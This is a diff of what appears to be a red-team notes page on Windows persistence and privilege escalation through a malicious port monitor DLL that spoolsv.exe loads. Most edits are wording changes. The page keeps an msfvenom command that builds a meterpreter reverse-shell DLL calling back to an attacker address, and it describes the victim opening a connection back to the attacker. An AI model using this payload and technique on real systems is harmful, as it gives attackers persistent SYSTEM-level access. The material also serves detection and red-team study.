@@ -6,11 +6,11 @@ description: 'Persistence, Privilege Escalation'
 
 ## Execution
 
-Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe as part of the technique - see bottom of the page for more info about the technique's high-lever overview:
+Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
-```text
+```csharp
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
 ```
 {% endcode-tabs-item %}
@@ -47,21 +47,19 @@ Move evil64.dll to `%systemroot%` and execute the compiled `monitor.cpp`.
 
 ## Observations
 
-Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed:
+Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed by the spoolsvc:
 
 ![](../.gitbook/assets/monitor-loaddll.png)
 
 ![](../.gitbook/assets/monitor-loaddll2.png)
 
-which spawns a rundll32 process \(meterpreter payload\) which initiates a connection back to the attacker:
+which eventually spawns a rundll32 with meterpreter payload, that initiates a connection back to the attacker:
 
 ![](../.gitbook/assets/rundll-connect.png)
 
-The attacker receives a reverse meterpreter session as **SYSTEM**:
-
 ![](../.gitbook/assets/monitor-shell-system.png)
 
-The below shows confirms the procmon results explained above:
+The below confirms the procmon results explained above:
 
 ![](../.gitbook/assets/monitor-spoolsvc-rundll.png)
 
